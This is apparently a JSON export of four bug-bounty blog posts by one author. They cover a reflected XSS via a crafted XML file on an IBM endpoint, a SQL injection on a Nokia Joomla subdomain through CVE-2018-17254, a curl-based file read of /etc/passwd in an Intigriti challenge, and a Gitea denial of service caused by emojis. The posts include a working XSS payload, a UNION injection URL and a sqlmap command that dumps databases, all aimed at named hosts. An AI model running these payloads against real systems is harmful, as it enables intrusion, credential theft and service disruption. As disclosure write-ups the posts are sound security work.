[{"ref":"https://blog.knas.me/blog/ibm_xss/","title":" [IBM] XSS Reflected via xml files","section":"blog","tags":["bugbounty","security","webpentesting"],"date":"2020.10.26","body":"Hello World :wave: while I\u0026rsquo;m doing some bug hunting on IBM subdomains I decided instead of using subdomain enumeration I can get interesting endpoints and parameters from waybackurls to shorten the time, after reading the URLs from waybackurls I noticed a lot of endpoints that contain some URLs of XML files in rssurl parameter\nhttps://www-356.ibm.com/partnerworld/wps/servlet/pwdyn/pw/rss/rsstojson.jsp?ccdb=no\u0026amp;rssurl=https://www-2000.ibm.com/file.xml\u0026amp;_=1596170198353 all this API endpoint do is read the XML from the URL and then return its value of it but in JSON, for the first time I thought there was an SSRF but after a lot of trying to bypass it, it doesn\u0026rsquo;t work at all\nbut from another side, I noticed that the response Content-type is text/HTML so I think I can do an xss here, the idea is I can make an XML file that contains the xss payload in one of the variables so after converting it to JSON it will be reflected in the page as an HTML code, like this {\u0026quot;data\u0026quot;: \u0026quot;\u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt;\u0026quot;}\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;something:script xmlns:something=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt;alert(1)\u0026lt;/something:script\u0026gt; \u0026lt;a:script xmlns:a=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt;alert(2)\u0026lt;/a:script\u0026gt; \u0026lt;info\u0026gt; \u0026lt;name\u0026gt; \u0026lt;value\u0026gt;\u0026lt;![CDATA[\u0026lt;script\u0026gt;confirm(document.domain)\u0026lt;/script\u0026gt;]]\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/name\u0026gt; \u0026lt;description\u0026gt; \u0026lt;value\u0026gt;Hello\u0026lt;/value\u0026gt; \u0026lt;/description\u0026gt; \u0026lt;url\u0026gt; \u0026lt;value\u0026gt;http://google.com\u0026lt;/value\u0026gt; \u0026lt;/url\u0026gt; \u0026lt;/info\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; then upload the file to my site and pass the URL to the rssurl parameter\nthe file should be converted like this\n{ \u0026#34;html\u0026#34;: { \u0026#34;head\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;body\u0026#34;: { \u0026#34;script\u0026#34;: [ \u0026#34;alert(1)\u0026#34;, \u0026#34;alert(2)\u0026#34; ], \u0026#34;info\u0026#34;: { \u0026#34;name\u0026#34;: { \u0026#34;value\u0026#34;: { \u0026#34;__cdata\u0026#34;: \u0026#34;\u0026lt;script\u0026gt;confirm(document.domain)\u0026lt;/script\u0026gt;\u0026#34; } }, \u0026#34;description\u0026#34;: { \u0026#34;value\u0026#34;: \u0026#34;Hello\u0026#34; }, \u0026#34;url\u0026#34;: { \u0026#34;value\u0026#34;: \u0026#34;http://google.com\u0026#34; } } } } } and boom\nsee ya :crossed_fingers: :heart:\n"},{"ref":"https://blog.knas.me/blog/nokia_sqli/","title":"SQL Injection on Nokia subdomain","section":"blog","tags":["bugbounty","security","webpentesting"],"date":"2019.11.04","body":"Hello :wave:, I\u0026rsquo;ll share with you how I found sqli on Nokia that makes me able to login into the admin page you will not see something new here like new techniques or something, just simple steps\nafter doing subdomain enumeration I found a subdomain that\u0026rsquo;s working with Joomla, after that I ran joomscan to get the version of the cms and plugins to see if there\u0026rsquo;s any outdated version to exploit it, and joomscan gives me an old plugin called JCK Editor with version 6.4.4 and after searching with this version on exploit-DB i found SQLI injection in this version CVE-2018-17254\nTest = [HOST]/[PATH]/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu\u0026amp;view=menu\u0026amp;parent=%22%20UNION%20SELECT%20NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL--%20aa as you can see, we can get the version of the database :mag:\nthis time for my fav weapon (SQLMAP)\n$ sqlmap -u \u0026#39;https://gdclive.nokia.com/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu\u0026amp;view=menu\u0026amp;parent=\u0026#39; --level=5 --risk=3 --random-agent --technique=U -p parent --batch --current-DB --current-user you can see the current user and the name of the database :)\nAfter dumping all databases using the \u0026ndash;all option and unencrypt the password of the admin account let\u0026rsquo;s login in admin panel\nsee ya :v:\n"},{"ref":"https://blog.knas.me/blog/initgriti_curl/","title":"How I Solved the intigriti CURL challenge","section":"blog","tags":["bugbounty","security","webpentesting"],"date":"2023.02.09","body":"I woke up this morning to something interesting from Initgrit on Twitter. That\u0026rsquo;s a good challenge for reading files from servers\nMy fast break is over, so I turn on my computer and start looking at the code they provided\nhttps://twitter.com/intigriti/status/1623663004532281348\nSource Code Review Basically, it accepts POST method with url and image parameters for \u0026lsquo;update picture\u0026rsquo;.\nThere are two validations here, one for the host, so the developer makes sure it\u0026rsquo;s localhost, and another for the image, so the extension makes sure it\u0026rsquo;s a real image\nIf all validations are fine, the backend will send an HTTP request with the value of the url parameter and the image name to upload the image\nAlsi the Curl is executing by subprocess.run with Shell=True flag, which means it\u0026rsquo;s use shell\nWe\u0026rsquo;re good, I thought I could inject some payloads with quotes and get RCE, and say yayyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\nAs fast as I figured out that the developer was using shelx.qoute to store all values between single quotes:(\n\u0026gt;\u0026gt;\u0026gt; from shlex import quote \u0026gt;\u0026gt;\u0026gt; command = \u0026#39;ls -l {}\u0026#39;.format(quote(filename)) \u0026gt;\u0026gt;\u0026gt; print(command) ls -l \u0026#39;somefile; rm -rf ~\u0026#39; \u0026gt;\u0026gt;\u0026gt; remote_command = \u0026#39;ssh home {}\u0026#39;.format(quote(command)) \u0026gt;\u0026gt;\u0026gt; print(remote_command) ssh home \u0026#39;ls -l \u0026#39;\u0026#34;\u0026#39;\u0026#34;\u0026#39;somefile; rm -rf ~\u0026#39;\u0026#34;\u0026#39;\u0026#34;\u0026#39;\u0026#39; Trying to bypass Ok, I accepted the challenge, and I didn\u0026rsquo;t want to start doing random stuff like fuzzing or anything like that Let me do a little research about shelx.quote and see if there are any new CVEs or warnings about it According to the official module documentation, there\u0026rsquo;s a warning POSIX is a family of standards, specified by the IEEE, to clarify and make uniform the application programming interfaces (and ancillary issues, such as command line shell utilities) provided by Unix operating systems.\nThen I\u0026rsquo;ll have to try bypassing this on a non-POSIX shell or on Windows There are two options here, one for Windows and one for testing it on Linux There\u0026rsquo;s only one problem: Linux is POSIX, and bash is also POSIX.\nGood damn I hate computers\nAnyhow, I looked for NON-POSIX shells for Linux and I found the \u0026lsquo;fish\u0026rsquo; shell, it\u0026rsquo;s awesome and non-posix, so let\u0026rsquo;s try it out\nAfter I fuzzed the parameter with singlequates bypassing all my techniques and spent an hour on it, it didn\u0026rsquo;t work that much. https://github.com/commixproject/commix/blob/master/src/core/tamper/singlequotes.py\nAnd after I saw that the file was in /home/[USER]/hello.png, I twitted about it to make sure it\u0026rsquo;s the right one Playing with CURL I took a look at curl after seeing this tweet and I noticed something Using the @ sign at the start of a file name can be readed by CURL As you remember, the developer makes sure the filename is PNG so PNG is good for me if this server was my friend server that sharing a good memes in the Slack #random channel but here the case is diffrent I want to read real stuff like /etc/passwd\nhmmmm what to do now ? As I started looking at the official documentation of CURL command, I found that with the -F option, I can upload the file name while reading another file, so I can upload a different file and then read a different file The file would be upload as meme.png, content would be /etc/passwd/ file This isn\u0026rsquo;t magic, but you can change the file parameters like the content, type, name, etc\u0026hellip;\noccurding to this page documetion page https://curl.se/docs/manpage.html#-F\nYou can add custom headers to the field by setting headers=, like\n$Â curl -F \u0026#34;submit=OK;headers=@headerfile\u0026#34; example.com that\u0026rsquo;s intersting let\u0026rsquo;s try this trick\nSolving the Chanlleng To get started, we need to bypass the url localhost check first. I did that with the burpsuite callback and added localhost at the beginning of the host like that: http://localhost.OAST_HOST.com And let\u0026rsquo;s use headers parameter to bypass the image extensions\nThen we\u0026rsquo;ll add a png file to the parameter value after adding the file we want to read in headers\nand here we go the response was 200 but by looking at the OAST log you can see we got the file content finally YAYYYY\nSo I send tweet about it and they said I\u0026rsquo;m right And I receved their message like this\nWhat I learned from that? a few things\nThink before doing anything READ AND READ The offical documentation you will learn a lot and yeah that\u0026rsquo;s it for today I hope you find this useful\nbye ..\n"},{"ref":"https://blog.knas.me/blog/gitea_dos/","title":"With a single request, you can kill any Gitea server","section":"blog","tags":["cybersecurity","bugbounty","dos"],"date":"2023.01.25","body":"Hey :smiley:\nin this blog I\u0026rsquo;m going to tell you how I was able to kill/dos any Gitea server I discovered this bug in Gitea version 1.14.2 in 2021\nwhich was fixed in 1.14.3 by the Gitea team Please note that I wasn\u0026rsquo;t targeting Gitea at all, I was doing some bug bounty hunting on a private target That target\u0026rsquo;s staging-dev.target.com has gitea on it\nand I thought, \u0026ldquo;Okay, I think there\u0026rsquo;s CVES for that product\u0026rdquo; and yeah I found some but Unfortunately, the POC isn\u0026rsquo;t included in the CVE report (only the PR on github)\nso I decided to play around and see if there\u0026rsquo;s any private keys in the repos on this gitea server (I didn\u0026rsquo;t find any)\nand my mind give me an idea, what If I created an account on this server? I thought I could find out more because maybe there\u0026rsquo;s an option that lets the user make the repositories private for people with an account on Gitea\nAfter creating my account, I didn\u0026rsquo;t see any difference so the last option I have is to send emojis to Gitea\u0026rsquo;s issues page for trolling or joking\nThen I opened Zaproxy and sent many of these emojis to the issues body API in one request Afterwards, I noticed that subdomain response time is going up I got a 500 error, and boom, the server wasn\u0026rsquo;t responding when I try to visit the gitea issue that I opened\nWhen I reported this bug to my target\u0026rsquo;s security team, the response was too fast, saying \u0026ldquo;Sorry, this is not a part of our products. Could you please forward this report to the Gitea security team\u0026rdquo; But what\u0026rsquo;s good is they provide me with more info to make a good report for the Gitea security team like logs, screenshots of CPU usage, etc. When someone visits my gitea issue containing the emojis, the CPU usage gets high. That\u0026rsquo;s because there\u0026rsquo;s too much text formatting/processing happening in the back-end for the comment After I reported the bug to Gitea, they asked me some questions about the environment and if I could reproduce it at the last version (it\u0026rsquo;s on try.gitea.io)\nI\u0026rsquo;ve included it in the report\nGitea version : 1.14.2 Git version: 2.32.0 Operating system: Linux Database: MySQL Can you reproduce the bug at https://try.gitea.io: Yes (https://try.gitea.io/dtestman/test/issues/1) They respond after 2 days with validating the bug and a PR, and my name is on the release page for my next release :smile:\nhere\u0026rsquo;s the release page: https://blog.gitea.io/2021/06/gitea-1.14.3-is-released/\nand the fix PR: https://github.com/go-gitea/gitea/pull/16185\nSee you\n"}]